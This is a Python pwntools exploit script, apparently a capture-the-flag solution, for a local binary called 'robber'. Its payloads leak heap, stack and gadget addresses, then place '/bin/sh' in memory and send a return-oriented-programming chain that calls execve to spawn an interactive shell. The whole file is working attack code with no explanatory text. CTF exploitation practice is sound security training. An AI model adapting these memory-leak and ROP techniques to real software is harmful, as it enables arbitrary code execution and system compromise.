from pwn import *

context.binary = "./robber"

#adds 0xa0 every time

#60 to hit payload
gdbscript = """
"""

#io = gdb.debug("./rop_lang",gdbscript=gdbscript)
io = process(["./robber","chall"])



padding = (p64(0x4090)*12)
padding_no_rbp = (p64(0x4090)*11)

read_call = p64(0x10)
write_call = p64(0x4)
next_gadget = p64(27-1)
add_gadget = p64(0x12)
write = p64(13-1)
ldr_gadget_1 = p64(0x13)
ldr_gadget_2 = p64(0x14)
ldr_gadget_3 = p64(0x16)
main = p64(0)
stack_pivot = p64(719-1)
ret = p64(0x10-1)


payload = [
    padding_no_rbp,
    p64(0x601800),
    add_gadget,
    ret,
    ret,
    ret,
    ldr_gadget_1,
    ret,
    ret,
    ret,
    ldr_gadget_2,
    ret,
    ret,
    ret,
    write
]


flag_len = 2631
io.recvuntil(b'The Kalmar flag is here! :(\n')

payload = b''.join(payload).ljust(0x100,b'\x00')
io.send(payload)

io.send(b'1')

leak = io.recvuntil(b'The Kalmar flag is here! :(\n')
heap_leak = u64(leak[-flag_len-0x8:-flag_len])

heap_base = heap_leak-0xb3f0

log.info(f"HEAP BASE: {heap_base:#x}")

stack_addr = p64(heap_base+0x598)

payload = [
    padding,
    write_call,
    main,
    p64(0x1),
    stack_addr,
    p64(0x8)
]

payload = b''.join(payload).ljust(0x100,b'\x00')

io.send(payload)

leak = io.recvuntil(b'The Kalmar flag is here! :(\n')

stack_leak = u64(leak[:-flag_len])
log.info(f"Stack leak: {stack_leak:#x}")

rop_gadget_addr = p64(heap_base+0x480)

payload = [
    padding,
    write_call,
    main,
    p64(0x1),
    rop_gadget_addr,
    p64(0x8)
]

payload = b''.join(payload).ljust(0x100,b'\x00')

io.send(payload)

leak = io.recvuntil(b'The Kalmar flag is here! :(\n')

gadget_leak = u64(leak[:-flag_len])

log.info(f"Gadgets: {gadget_leak:#x}")

pop_rax = gadget_leak + 0x37
pop_rdi = gadget_leak + 0x39
pop_rsi = gadget_leak + 0x3b
pop_rdx = gadget_leak + 0x3d
syscall = gadget_leak + 0x48

rw_area = heap_base+0x3c80

payload = [
    padding,
    read_call,
    next_gadget,
    p64(0x0),
    p64(rw_area),
    p64(0x8),
    read_call,
    next_gadget,
    p64(0x0),
    p64(stack_leak+8),
    p64(0x100),
    p64(0x0)
]

payload = b''.join(payload).ljust(0x100,b'\x00')

io.send(payload)

io.send(b'/bin/sh\x00')

rop_chain = [
    p64(pop_rax),
    p64(59),
    p64(pop_rdi),
    p64(rw_area),
    p64(pop_rsi),
    p64(0x0),
    p64(pop_rdx),
    p64(0x0),
    p64(syscall)
]

rop_chain = b''.join(rop_chain).ljust(0x100,b'\x00')

io.send(rop_chain)



io.interactive()
